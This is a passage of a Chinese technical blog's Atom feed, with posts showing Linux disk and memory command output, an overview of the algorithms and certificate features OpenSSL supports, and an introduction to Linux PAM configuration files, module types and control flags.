/dev/sda: 21.5 GB, 21474836480 bytes, 41943040 sectorsUnits = sectors of 1 * 512 = 512 bytesSector size (logical/physical): 512 bytes / 512 bytesI/O size (minimum/optimal): 512 bytes / 512 bytesDisk label type: dosDisk identifier: 0x000d2bb3   Device Boot      Start         End      Blocks   Id  System/dev/sda1   *        2048     2099199     1048576   83  Linux/dev/sda2         2099200    41943039    19921920   8e  Linux LVMDisk /dev/sdb: 10.7 GB, 10737418240 bytes, 20971520 sectorsUnits = sectors of 1 * 512 = 512 bytesSector size (logical/physical): 512 bytes / 512 bytesI/O size (minimum/optimal): 512 bytes / 512 bytesDisk /dev/sdc: 10.7 GB, 10737418240 bytes, 20971520 sectorsUnits = sectors of 1 * 512 = 512 bytesSector size (logical/physical): 512 bytes / 512 bytesI/O size (minimum/optimal): 512 bytes / 512 bytesDisk /dev/sde: 10.7 GB, 10737418240 bytes, 20971520 sectorsUnits = sectors of 1 * 512 = 512 bytesSector size (logical/physical): 512 bytes / 512 bytesI/O size (minimum/optimal): 512 bytes / 512 bytesDisk /dev/sdf: 10.7 GB, 10737418240 bytes, 20971520 sectorsUnits = sectors of 1 * 512 = 512 bytesSector size (logical/physical): 512 bytes / 512 bytesI/O size (minimum/optimal): 512 bytes / 512 bytesDisk /dev/sdd: 10.7 GB, 10737418240 bytes, 20971520 sectorsUnits = sectors of 1 * 512 = 512 bytesSector size (logical/physical): 512 bytes / 512 bytesI/O size (minimum/optimal): 512 bytes / 512 bytesDisk /dev/sdg: 10.7 GB, 10737418240 bytes, 20971520 sectorsUnits = sectors of 1 * 512 = 512 bytesSector size (logical/physical): 512 bytes / 512 bytesI/O size (minimum/optimal): 512 bytes / 512 bytesDisk /dev/mapper/rhel-root: 18.2 GB, 18249416704 bytes, 35643392 sectorsUnits = sectors of 1 * 512 = 512 bytesSector size (logical/physical): 512 bytes / 512 bytesI/O size (minimum/optimal): 512 bytes / 512 bytesDisk /dev/mapper/rhel-swap: 2147 MB, 2147483648 bytes, 4194304 sectorsUnits = sectors of 1 * 512 = 512 bytesSector size (logical/physical): 512 bytes / 512 bytesI/O size (minimum/optimal): 512 bytes / 512 bytes[root@rhel7 ~]#</code></pre><p><strong>df</strong></p><pre><code class="mbox">[root@rhel7 ~]# df -hFilesystem             Size  Used Avail Use% Mounted on/dev/mapper/rhel-root   17G  4.7G   13G  28% /devtmpfs               478M     0  478M   0% /devtmpfs                  489M     0  489M   0% /dev/shmtmpfs                  489M  6.8M  482M   2% /runtmpfs                  489M     0  489M   0% /sys/fs/cgroup/dev/sr0               3.6G  3.6G     0 100% /media/cdrom/dev/sda1             1014M  121M  894M  12% /boottmpfs                   98M     0   98M   0% /run/user/0[root@rhel7 ~]#</code></pre><h4 id="2-5-5-&#x6574;&#x4F53;"><a href="#2-5-5-&#x6574;&#x4F53;" class="headerlink" title="2.5.5 &#x6574;&#x4F53;"></a>2.5.5 &#x6574;&#x4F53;</h4><p><strong>vmstat</strong></p><pre><code class="mbox">[root@rhel7 ~]# vmstatprocs -----------memory---------- ---swap-- -----io---- -system-- ------cpu----- r  b   swpd   free   buff  cache   si   so    bi    bo   in   cs us sy id wa st 2  0 220132 137404     56 185372    0    1     6     6   87   12  0  0 99  0  0[root@rhel7 ~]#</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;&amp;#x6027;&amp;#x80FD;&amp;#x6D4B;&amp;#x8BD5;&amp;#x2014;&amp;#x2014;&amp;#x6027;&amp;#x80FD;&amp;#x6D4B;&amp;#x8BD5;&amp;#x5404;&amp;#x6307;&amp;#x6807;&amp;#x8BF4;&amp;#x660E;&quot;&gt;&lt;a href=&quot;#
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>OpenSSL使用教程</title>
    <link href="https://marnm.github.io//posts/e8c4eb08/"/>
    <id>https://marnm.github.io//posts/e8c4eb08/</id>
    <published>2022-06-07T04:54:01.000Z</published>
    <updated>2022-06-07T05:01:27.938Z</updated>
    
    <content type="html"><![CDATA[<h2 id="OpenSSL"><a href="#OpenSSL" class="headerlink" title="OpenSSL"></a>OpenSSL</h2><h3 id="OpenSSL&#x7684;&#x652F;&#x6301;&#x5BF9;&#x79F0;&#x52A0;&#x5BC6;&#x7B97;&#x6CD5;"><a href="#OpenSSL&#x7684;&#x652F;&#x6301;&#x5BF9;&#x79F0;&#x52A0;&#x5BC6;&#x7B97;&#x6CD5;" class="headerlink" title="OpenSSL&#x7684;&#x652F;&#x6301;&#x5BF9;&#x79F0;&#x52A0;&#x5BC6;&#x7B97;&#x6CD5;"></a>OpenSSL&#x7684;&#x652F;&#x6301;&#x5BF9;&#x79F0;&#x52A0;&#x5BC6;&#x7B97;&#x6CD5;</h3><p><strong>OpenSSL&#x4E00;&#x5171;&#x63D0;&#x4F9B;&#x4E86;8&#x79CD;&#x5BF9;&#x79F0;&#x52A0;&#x5BC6;&#x7B97;&#x6CD5;</strong><br>7&#x79CD;&#x5206;&#x7EC4;&#x52A0;&#x5BC6;&#x7B97;&#x6CD5; + 1&#x79CD;&#x6D41;&#x52A0;&#x5BC6;&#x7B97;&#x6CD5;RC4<br>&#x5206;&#x7EC4;&#x52A0;&#x5BC6;&#x7B97;&#x6CD5;&#x5206;&#x522B;&#x662F;&#xFF1A;AES&#x3001;DES&#x3001;Blowfish&#x3001;CAST&#x3001;IDEA&#x3001;RC2&#x3001;RC5</p><p><strong>&#x56DB;&#x79CD;&#x5E38;&#x7528;&#x7684;&#x5206;&#x7EC4;&#x5BC6;&#x7801;&#x52A0;&#x5BC6;&#x6A21;&#x5F0F;</strong>  </p><ul><li>&#x7535;&#x5B50;&#x5BC6;&#x7801;&#x672C;&#x6A21;&#x5F0F;&#xFF08;ECB&#xFF09;&#x3001;</li><li>&#x52A0;&#x5BC6;&#x5206;&#x7EC4;&#x94FE;&#x63A5;&#x6A21;&#x5F0F;&#xFF08;CBC&#xFF09;&#x3001;</li><li>&#x52A0;&#x5BC6;&#x53CD;&#x9988;&#x6A21;&#x5F0F;&#xFF08;CFB&#xFF09;  </li><li>&#x8F93;&#x51FA;&#x53CD;&#x9988;&#x6A21;&#x5F0F;&#xFF08;OFB&#xFF09;</li></ul><p><strong>&#x5176;&#x4E2D;&#xFF1A;</strong><br>AES&#x4F7F;&#x7528;&#x52A0;&#x5BC6;&#x53CD;&#x9988;&#x6A21;&#x5F0F;&#xFF08;CFB&#xFF09;&#x548C;&#x8F93;&#x51FA;&#x53CD;&#x9988;&#x6A21;&#x5F0F;&#xFF08;OFB&#xFF09;&#x5206;&#x7EC4;&#x957F;&#x5EA6;&#x662F;128&#x4F4D;<br>&#x5176;&#x5B83;&#x7B97;&#x6CD5;&#x4F7F;&#x7528;&#x7684;&#x5219;&#x662F;64&#x4F4D;&#x3002;<br>&#x4E8B;&#x5B9E;&#x4E0A;&#xFF0C;DES&#x7B97;&#x6CD5;&#x91CC;&#x9762;&#x4E0D;&#x4EC5;&#x4EC5;&#x662F;&#x5E38;&#x7528;&#x7684;DES&#x7B97;&#x6CD5;&#xFF0C;&#x8FD8;&#x652F;&#x6301;&#x4E09;&#x4E2A;&#x5BC6;&#x94A5;&#x548C;&#x4E24;&#x4E2A;&#x5BC6;&#x94A5;3DES&#x7B97;&#x6CD5;&#x3002; </p><h3 id="OpenSSL&#x652F;&#x6301;&#x7684;&#x975E;&#x5BF9;&#x79F0;&#x52A0;&#x5BC6;&#x7B97;&#x6CD5;"><a href="#OpenSSL&#x652F;&#x6301;&#x7684;&#x975E;&#x5BF9;&#x79F0;&#x52A0;&#x5BC6;&#x7B97;&#x6CD5;" class="headerlink" title="OpenSSL&#x652F;&#x6301;&#x7684;&#x975E;&#x5BF9;&#x79F0;&#x52A0;&#x5BC6;&#x7B97;&#x6CD5;"></a>OpenSSL&#x652F;&#x6301;&#x7684;&#x975E;&#x5BF9;&#x79F0;&#x52A0;&#x5BC6;&#x7B97;&#x6CD5;</h3><p><strong>OpenSSL&#x4E00;&#x5171;&#x5B9E;&#x73B0;&#x4E86;4&#x79CD;&#x975E;&#x5BF9;&#x79F0;&#x52A0;&#x5BC6;&#x7B97;&#x6CD5;</strong>&#xFF0C;&#x5305;&#x62EC;<code>DH</code>&#x7B97;&#x6CD5;&#x3001;<code>RSA</code>&#x7B97;&#x6CD5;&#x3001;<code>DSA</code>&#x7B97;&#x6CD5;&#x548C;&#x692D;&#x5706;&#x66F2;&#x7EBF;&#x7B97;&#x6CD5;&#xFF08;<code>EC</code>&#xFF09;&#x3002;<br><code>DH</code>&#x7B97;&#x6CD5;&#x4E00;&#x822C;&#x7528;&#x4E8E;&#x5BC6;&#x94A5;&#x4EA4;&#x6362;&#x3002;<br><code>RSA</code>&#x7B97;&#x6CD5;&#x65E2;&#x53EF;&#x4EE5;&#x7528;&#x4E8E;&#x5BC6;&#x94A5;&#x4EA4;&#x6362;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x7528;&#x4E8E;&#x6570;&#x5B57;&#x7B7E;&#x540D;&#xFF0C;&#x5F53;&#x7136;&#xFF0C;&#x5982;&#x679C;&#x4F60;&#x80FD;&#x591F;&#x5FCD;&#x53D7;&#x5176;&#x7F13;&#x6162;&#x7684;&#x901F;&#x5EA6;&#xFF0C;&#x90A3;&#x4E48;&#x4E5F;&#x53EF;&#x4EE5;&#x7528;&#x4E8E;&#x6570;&#x636E;&#x52A0;&#x5BC6;&#x3002;<br><code>DSA</code>&#x7B97;&#x6CD5;&#x5219;&#x4E00;&#x822C;&#x53EA;&#x7528;&#x4E8E;&#x6570;&#x5B57;&#x7B7E;&#x540D;&#x3002;</p><h3 id="OpenSSL&#x652F;&#x6301;&#x7684;&#x4FE1;&#x606F;&#x6458;&#x8981;&#x7B97;&#x6CD5;"><a href="#OpenSSL&#x652F;&#x6301;&#x7684;&#x4FE1;&#x606F;&#x6458;&#x8981;&#x7B97;&#x6CD5;" class="headerlink" title="OpenSSL&#x652F;&#x6301;&#x7684;&#x4FE1;&#x606F;&#x6458;&#x8981;&#x7B97;&#x6CD5;"></a>OpenSSL&#x652F;&#x6301;&#x7684;&#x4FE1;&#x606F;&#x6458;&#x8981;&#x7B97;&#x6CD5;</h3><p><strong>OpenSSL&#x5B9E;&#x73B0;&#x4E86;5&#x79CD;&#x4FE1;&#x606F;&#x6458;&#x8981;&#x7B97;&#x6CD5;</strong>&#xFF0C;&#x5206;&#x522B;&#x662F;<code>MD2</code>&#x3001;<code>MD5</code>&#x3001;<code>MDC2</code>&#x3001;<code>SHA&#xFF08;SHA1&#xFF09;</code>&#x548C;<code>RIPEMD</code>&#x3002;SHA&#x7B97;&#x6CD5;&#x4E8B;&#x5B9E;&#x4E0A;&#x5305;&#x62EC;&#x4E86;SHA&#x548C;SHA1&#x4E24;&#x79CD;&#x4FE1;&#x606F;&#x6458;&#x8981;&#x7B97;&#x6CD5;&#xFF0C;&#x6B64;&#x5916;&#xFF0C;OpenSSL&#x8FD8;&#x5B9E;&#x73B0;&#x4E86;DSS&#x6807;&#x51C6;&#x4E2D;&#x89C4;&#x5B9A;&#x7684;&#x4E24;&#x79CD;&#x4FE1;&#x606F;&#x6458;&#x8981;&#x7B97;&#x6CD5;DSS&#x548C;DSS1&#x3002; </p><h3 id="&#x57FA;&#x4E8E;OpenSSL&#x7684;&#x5BC6;&#x94A5;&#x4E0E;&#x8BC1;&#x4E66;&#x7BA1;&#x7406;"><a href="#&#x57FA;&#x4E8E;OpenSSL&#x7684;&#x5BC6;&#x94A5;&#x4E0E;&#x8BC1;&#x4E66;&#x7BA1;&#x7406;" class="headerlink" title="&#x57FA;&#x4E8E;OpenSSL&#x7684;&#x5BC6;&#x94A5;&#x4E0E;&#x8BC1;&#x4E66;&#x7BA1;&#x7406;"></a>&#x57FA;&#x4E8E;OpenSSL&#x7684;&#x5BC6;&#x94A5;&#x4E0E;&#x8BC1;&#x4E66;&#x7BA1;&#x7406;</h3><p>&#x5BC6;&#x94A5;&#x548C;&#x8BC1;&#x4E66;&#x7BA1;&#x7406;&#x662F;PKI&#x7684;&#x4E00;&#x4E2A;&#x91CD;&#x8981;&#x7EC4;&#x6210;&#x90E8;&#x5206;&#xFF0C;OpenSSL&#x4E3A;&#x4E4B;&#x63D0;&#x4F9B;&#x4E86;&#x4E30;&#x5BCC;&#x7684;&#x529F;&#x80FD;&#xFF0C;&#x652F;&#x6301;&#x591A;&#x79CD;&#x6807;&#x51C6;&#x3002; </p><p>&#x9996;&#x5148;&#xFF0C;OpenSSL&#x5B9E;&#x73B0;&#x4E86;ASN.1&#x7684;&#x8BC1;&#x4E66;&#x548C;&#x5BC6;&#x94A5;&#x76F8;&#x5173;&#x6807;&#x51C6;&#xFF0C;&#x63D0;&#x4F9B;&#x4E86;&#x5BF9;&#x8BC1;&#x4E66;&#x3001;&#x516C;&#x94A5;&#x3001;&#x79C1;&#x94A5;&#x3001;&#x8BC1;&#x4E66;&#x8BF7;&#x6C42;&#x4EE5;&#x53CA;CRL&#x7B49;&#x6570;&#x636E;&#x5BF9;&#x8C61;&#x7684;DER&#x3001;PEM&#x548C;BASE64&#x7684;&#x7F16;&#x89E3;&#x7801;&#x529F;&#x80FD;&#x3002;<br>OpenSSL&#x63D0;&#x4F9B;&#x4E86;&#x4EA7;&#x751F;&#x5404;&#x79CD;&#x516C;&#x5F00;&#x5BC6;&#x94A5;&#x5BF9;&#x548C;&#x5BF9;&#x79F0;&#x5BC6;&#x94A5;&#x7684;&#x65B9;&#x6CD5;&#x3001;&#x51FD;&#x6570;&#x548C;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#xFF0C;&#x540C;&#x65F6;&#x63D0;&#x4F9B;&#x4E86;&#x5BF9;&#x516C;&#x94A5;&#x548C;&#x79C1;&#x94A5;&#x7684;DER&#x7F16;&#x89E3;&#x7801;&#x529F;&#x80FD;&#x3002;&#x5E76;&#x5B9E;&#x73B0;&#x4E86;&#x79C1;&#x94A5;&#x7684;PKCS#12&#x548C;PKCS#8&#x7684;&#x7F16;&#x89E3;&#x7801;&#x529F;&#x80FD;&#x3002;OpenSSL&#x5728;&#x6807;&#x51C6;&#x4E2D;&#x63D0;&#x4F9B;&#x4E86;&#x5BF9;&#x79C1;&#x94A5;&#x7684;&#x52A0;&#x5BC6;&#x4FDD;&#x62A4;&#x529F;&#x80FD;&#xFF0C;&#x4F7F;&#x5F97;&#x5BC6;&#x94A5;&#x53EF;&#x4EE5;&#x5B89;&#x5168;&#x5730;&#x8FDB;&#x884C;&#x5B58;&#x50A8;&#x548C;&#x5206;&#x53D1;&#x3002; </p><p>&#x5728;&#x6B64;&#x57FA;&#x7840;&#x4E0A;&#xFF0C;OpenSSL&#x5B9E;&#x73B0;&#x4E86;&#x5BF9;&#x8BC1;&#x4E66;&#x7684;X.509&#x6807;&#x51C6;&#x7F16;&#x89E3;&#x7801;&#x3001;PKCS#12&#x683C;&#x5F0F;&#x7684;&#x7F16;&#x89E3;&#x7801;&#x4EE5;&#x53CA;PKCS#7&#x7684;&#x7F16;&#x89E3;&#x7801;&#x529F;&#x80FD;&#x3002;&#x5E76;&#x63D0;&#x4F9B;&#x4E86;&#x4E00;&#x79CD;&#x6587;&#x672C;&#x6570;&#x636E;&#x5E93;&#xFF0C;<strong>&#x652F;&#x6301;&#x8BC1;&#x4E66;&#x7684;&#x7BA1;&#x7406;&#x529F;&#x80FD;&#xFF0C;&#x5305;&#x62EC;&#x8BC1;&#x4E66;&#x5BC6;&#x94A5;&#x4EA7;&#x751F;&#x3001;&#x8BF7;&#x6C42;&#x4EA7;&#x751F;&#x3001;&#x8BC1;&#x4E66;&#x7B7E;&#x53D1;&#x3001;&#x540A;&#x9500;&#x548C;&#x9A8C;&#x8BC1;&#x7B49;&#x529F;&#x80FD;&#x3002;</strong> </p><p>&#x4E8B;&#x5B9E;&#x4E0A;&#xFF0C;OpenSSL&#x63D0;&#x4F9B;&#x7684;CA&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x5C31;&#x662F;&#x4E00;&#x4E2A;&#x5C0F;&#x578B;&#x7684;&#x8BC1;&#x4E66;&#x7BA1;&#x7406;&#x4E2D;&#x5FC3;&#xFF08;CA&#xFF09;&#xFF0C;&#x5B9E;&#x73B0;&#x4E86;&#x8BC1;&#x4E66;&#x7B7E;&#x53D1;&#x7684;&#x6574;&#x4E2A;&#x6D41;&#x7A0B;&#x548C;&#x8BC1;&#x4E66;&#x7BA1;&#x7406;&#x7684;&#x5927;&#x90E8;&#x5206;&#x673A;&#x5236;&#x3002;</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;OpenSSL&quot;&gt;&lt;a href=&quot;#OpenSSL&quot; class=&quot;headerlink&quot; title=&quot;OpenSSL&quot;&gt;&lt;/a&gt;OpenSSL&lt;/h2&gt;&lt;h3 id=&quot;OpenSSL&amp;#x7684;&amp;#x652F;&amp;#x6301;&amp;#x5BF9;&amp;#x79F
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Linux的PAM模块</title>
    <link href="https://marnm.github.io//posts/ee2f9f35/"/>
    <id>https://marnm.github.io//posts/ee2f9f35/</id>
    <published>2022-06-07T04:53:50.000Z</published>
    <updated>2022-06-07T05:01:53.535Z</updated>
    
    <content type="html"><![CDATA[<h3 id="&#x4E00;&#x3001;pam&#x7B80;&#x4ECB;"><a href="#&#x4E00;&#x3001;pam&#x7B80;&#x4ECB;" class="headerlink" title="&#x4E00;&#x3001;pam&#x7B80;&#x4ECB;"></a>&#x4E00;&#x3001;pam&#x7B80;&#x4ECB;</h3><p>  Linux-PAM&#xFF08;Pluggable Authentication Module for Linux&#xFF0C;Linux&#x53EF;&#x63D2;&#x5165;&#x8BA4;&#x8BC1;&#x6A21;&#x5757;&#xFF09;&#x662F;&#x4E00;&#x5957;&#x5171;&#x4EAB;&#x5E93;&#xFF0C;&#x4F7F;&#x672C;&#x5730;&#x7CFB;&#x7EDF;&#x7BA1;&#x7406;&#x5458;&#x53EF;&#x4EE5;&#x968F;&#x610F;&#x9009;&#x62E9;&#x7A0B;&#x5E8F;&#x7684;&#x8BA4;&#x8BC1;&#x65B9;&#x5F0F;&#x3002;&#x6362;&#x53E5;&#x8BDD;&#x8BF4;&#xFF0C;&#x4E0D;&#x7528;&#xFF08;&#x91CD;&#x5199;&#x7F16;&#x5199;&#xFF09;&#x91CD;&#x65B0;&#x7F16;&#x8BD1;&#x4E00;&#x4E2A;&#x5305;&#x542B;PAM&#x529F;&#x80FD;&#x7684;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#xFF0C;&#x5C31;&#x53EF;&#x4EE5;&#x6539;&#x53D8;&#x5B83;&#x4F7F;&#x7528;&#x7684;&#x8BA4;&#x8BC1;&#x673A;&#x5236;&#x3002;&#x8FD9;&#x79CD;&#x65B9;&#x5F0F;&#x4E0B;&#xFF0C;&#x5C31;&#x7B97;&#x5347;&#x7EA7;&#x672C;&#x5730;&#x8BA4;&#x8BC1;&#x673A;&#x5236;&#xFF0C;&#x4E5F;&#x4E0D;&#x7528;&#x4FEE;&#x6539;&#x7A0B;&#x5E8F;&#x3002;</p><p>   PAM&#x4F7F;&#x7528;&#x914D;&#x7F6E;<code>/etc/pam.d/</code> &#x4E0B;&#x7684;&#x6587;&#x4EF6;&#x6765;&#x7BA1;&#x7406;&#x5BF9;&#x7A0B;&#x5E8F;&#x7684;&#x8BA4;&#x8BC1;&#x65B9;&#x5F0F;&#x3002;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#xFF0C;&#x8C03;&#x7528;&#x54CD;&#x5E94;&#x7684;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#xFF0C;&#x4ECE;&#x800C;&#x8C03;&#x7528;&#x672C;&#x5730;&#x7684;&#x8BA4;&#x8BC1;&#x6A21;&#x5757;&#x3002;&#x6A21;&#x5757;&#x653E;&#x7F6E;&#x5728;<code>/lib64/security</code>&#xFF08;x86&#x7CFB;&#x7EDF;&#x653E;&#x5728;/lib/security&#xFF09;&#x76EE;&#x5F55;&#x4E0B;&#xFF0C;&#x4EE5;&#x52A0;&#x8F7D;&#x52A8;&#x6001;&#x5E93;&#x7684;&#x5F62;&#x5F0F;&#x8FDB;&#x5165;&#xFF0C;&#x50CF;&#x6211;&#x4EEC;&#x4F7F;&#x7528;su&#x547D;&#x4EE4;&#x65F6;&#xFF0C;&#x7CFB;&#x7EDF;&#x4F1A;&#x63D0;&#x793A;&#x8F93;&#x5165;root&#x7528;&#x6237;&#x7684;&#x5BC6;&#x7801;&#x3002;&#x8FD9;&#x5C31;&#x662F;su&#x547D;&#x4EE4;&#x901A;&#x8FC7;&#x8C03;&#x7528;PAM&#x6A21;&#x5757;&#x5B9E;&#x73B0;&#x7684;&#x3002;</p><h3 id="PAM&#x7684;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x4ECB;&#x7ECD;"><a href="#PAM&#x7684;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x4ECB;&#x7ECD;" class="headerlink" title="PAM&#x7684;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x4ECB;&#x7ECD;"></a>PAM&#x7684;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x4ECB;&#x7ECD;</h3><p>  PAM&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x6709;&#x4E24;&#x79CD;&#x5199;&#x6CD5;:</p><ul><li>&#x4E00;&#x79CD;&#x662F;&#x5199;&#x5728;/etc/pam.conf&#x6587;&#x4EF6;&#x4E2D;&#xFF0C;&#x4F46;centos6&#x4E4B;&#x540E;&#x7684;&#x7CFB;&#x7EDF;&#x4E2D;&#xFF0C;&#x8FD9;&#x4E2A;&#x6587;&#x4EF6;&#x5C31;&#x6CA1;&#x6709;&#x4E86;&#x3002;</li><li>&#x53E6;&#x4E00;&#x79CD;&#x5199;&#x6CD5;&#x662F;,&#x5C06;PAM&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x653E;&#x5230;/etc/pam.d/&#x76EE;&#x5F55;&#x4E0B;,&#x5176;&#x89C4;&#x5219;&#x5185;&#x5BB9;&#x90FD;&#x662F;&#x4E0D;&#x5305;&#x542B; service &#x90E8;&#x5206;&#x7684;&#xFF0C;&#x5373;&#x4E0D;&#x5305;&#x542B;&#x670D;&#x52A1;&#x540D;&#x79F0;&#xFF0C;&#x800C;/etc/pam.d &#x76EE;&#x5F55;&#x4E0B;&#x6587;&#x4EF6;&#x7684;&#x540D;&#x5B57;&#x5C31;&#x662F;&#x670D;&#x52A1;&#x540D;&#x79F0;&#x3002;&#x5982;: vsftpd,login&#x7B49;.,&#x53EA;&#x662F;&#x5C11;&#x4E86;&#x6700;&#x5DE6;&#x8FB9;&#x7684;&#x670D;&#x52A1;&#x540D;&#x5217;.&#x5982;:/etc/pam.d/sshd</li></ul><p><img src="https://gitee.com/fnaichu/mypicbed/raw/master/img/202205072144562.png" alt=""></p><p>&#x7531;&#x4E0A;&#x56FE;&#x53EF;&#x4EE5;&#x5C06;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x5206;&#x4E3A;&#x56DB;&#x5217;&#xFF0C;<br>&#x7B2C;&#x4E00;&#x5217;&#x4EE3;&#x8868;&#x6A21;&#x5757;&#x7C7B;&#x578B;<br>&#x7B2C;&#x4E8C;&#x5217;&#x4EE3;&#x8868;&#x63A7;&#x5236;&#x6807;&#x8BB0;<br>&#x7B2C;&#x4E09;&#x5217;&#x4EE3;&#x8868;&#x6A21;&#x5757;&#x8DEF;&#x5F84;<br>&#x7B2C;&#x56DB;&#x3001;&#x4E94;&#x5217;&#x4EE3;&#x8868;&#x6A21;&#x5757;&#x53C2;&#x6570;</p><h3 id="1-PAM&#x7684;&#x6A21;&#x5757;&#x7C7B;&#x578B;"><a href="#1-PAM&#x7684;&#x6A21;&#x5757;&#x7C7B;&#x578B;" class="headerlink" title="1. PAM&#x7684;&#x6A21;&#x5757;&#x7C7B;&#x578B;"></a>1. PAM&#x7684;&#x6A21;&#x5757;&#x7C7B;&#x578B;</h3><p>Linux-PAM&#x6709;&#x56DB;&#x79CD;&#x6A21;&#x5757;&#x7C7B;&#x578B;&#xFF0C;&#x5206;&#x522B;&#x4EE3;&#x8868;&#x56DB;&#x79CD;&#x4E0D;&#x540C;&#x7684;&#x4EFB;&#x52A1;<br>&#x5B83;&#x4EEC;&#x662F;&#xFF1A;&#x8BA4;&#x8BC1;&#x7BA1;&#x7406;auth&#x3001;&#x8D26;&#x53F7;&#x7BA1;&#x7406;account&#x3001;&#x4F1A;&#x8BDD;&#x7BA1;&#x7406;session&#x3001;&#x5BC6;&#x7801;&#x7BA1;&#x7406;password&#xFF0C;&#x4E00;&#x4E2A;&#x7C7B;&#x578B;&#x53EF;&#x80FD;&#x6709;&#x591A;&#x884C;&#xFF0C;&#x5B83;&#x4EEC;&#x6309;&#x987A;&#x5E8F;&#x4E00;&#x6B21;&#x7531;PAM&#x6A21;&#x5757;&#x8C03;&#x7528;&#x3002;</p><table><thead><tr><th>&#x7BA1;&#x7406;&#x65B9;&#x5F0F;</th><th>&#x8BF4;&#x660E;</th></tr></thead><tbody><tr><td>auth</td><td>&#x7528;&#x6765;&#x5BF9;&#x7528;&#x6237;&#x7684;&#x8EAB;&#x4EFD;&#x8FDB;&#x884C;&#x8BC6;&#x522B;&#x3002;&#x5982;&#xFF1A;&#x63D0;&#x793A;&#x7528;&#x6237;&#x8F93;&#x5165;&#x5BC6;&#x7801;&#xFF0C;&#x6216;&#x5224;&#x65AD;&#x4F7F;&#x7528;&#x662F;&#x5426;&#x4E3A;root&#x7B49;</td></tr><tr><td>account</td><td>&#x5BF9;&#x8D26;&#x53F7;&#x7684;&#x4E2A;&#x5411;&#x5C5E;&#x6027;&#x8FDB;&#x884C;&#x68C0;&#x67E5;&#x3002;&#x5982;&#xFF1A;&#x662F;&#x5426;&#x5141;&#x8BB8;&#x767B;&#x5F55;&#xFF0C;&#x662F;&#x5426;&#x8FBE;&#x5230;&#x6700;&#x5927;&#x7528;&#x6237;&#x6570;&#xFF0C;&#x6216;&#x662F;root&#x7528;&#x6237;&#x662F;&#x5426;&#x5141;&#x8BB8;&#x5728;&#x8FD9;&#x4E2A;&#x7EC8;&#x7AEF;&#x767B;&#x5F55;&#x7B49;</td></tr><tr><td>session</td><td>&#x8FD9;&#x4E2A;&#x6A21;&#x5757;&#x7528;&#x6765;&#x5B9A;&#x4E49;&#x7528;&#x6237;&#x6265;&#x4F30;&#x524D;&#x7684;&#xFF0C;&#x53CA;&#x7528;&#x6237;&#x9000;&#x51FA;&#x540E;&#x6240;&#x8981;&#x8FDB;&#x884C;&#x7684;&#x64CD;&#x4F5C;&#x3002;&#x5982;&#xFF1A;&#x767B;&#x5F55;&#x8FDE;&#x63A5;&#x4FE1;&#x606F;&#xFF0C;&#x7528;&#x6237;&#x6570;&#x7684;&#x6253;&#x5F00;&#x4E0E;&#x5173;&#x95ED;&#xFF0C;&#x6302;&#x8F7D;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#x7B49;&#x3002;</td></tr><tr><td>password</td><td>&#x4F7F;&#x7528;&#x7528;&#x6237;&#x4FE1;&#x606F;&#x6765;&#x66F4;&#x65B0;&#x3002;&#x5982;&#xFF1A;&#x4FEE;&#x6539;&#x7528;&#x6237;&#x5BC6;&#x7801;</td></tr></tbody></table><h3 id="2-PAM&#x7684;&#x63A7;&#x5236;&#x6807;&#x8BB0;"><a href="#2-PAM&#x7684;&#x63A7;&#x5236;&#x6807;&#x8BB0;" class="headerlink" title="2. PAM&#x7684;&#x63A7;&#x5236;&#x6807;&#x8BB0;"></a>2. PAM&#x7684;&#x63A7;&#x5236;&#x6807;&#x8BB0;</h3><p>PAM&#x4F7F;&#x7528;&#x63A7;&#x5236;&#x6807;&#x8BB0;&#x6765;&#x5904;&#x7406;&#x548C;&#x5224;&#x65AD;&#x5404;&#x4E2A;&#x6A21;&#x5757;&#x7684;&#x8FD4;&#x56DE;&#x503C;&#x3002;&#xFF08;&#x5728;&#x6B64;&#x53EA;&#x8BF4;&#x660E;&#x7B80;&#x5355;&#x7684;&#x8BA4;&#x8BC1;&#x6807;&#x8BB0;&#xFF09;</p><table><thead><tr><th>&#x63A7;&#x5236;&#x6807;&#x8BB0;</th><th>&#x8BF4;&#x660E;</th></tr></thead><tbody><tr><td>required</td><td>&#x8868;&#x793A;&#x53CA;&#x65F6;&#x67D0;&#x4E2A;&#x6A21;&#x5757;&#x5BF9;&#x7528;&#x6237;&#x7684;&#x6768;&#x5CE5;&#x5931;&#x8D25;&#xFF0C;&#x4E5F;&#x8981;&#x7B49;&#x6240;&#x6709;&#x7684;&#x6A21;&#x5757;&#x90FD;&#x6267;&#x884C;&#x5B8C;&#x6BD5;&#x540E;&#xFF0C;PAM&#x624D;&#x653E;&#x56DE;&#x9519;&#x8BEF;&#x4FE1;&#x606F;&#x3002;&#x8FD9;&#x6837;&#x505A;&#x662F;&#x4E3A;&#x4E86;&#x4E0D;&#x8BA9;&#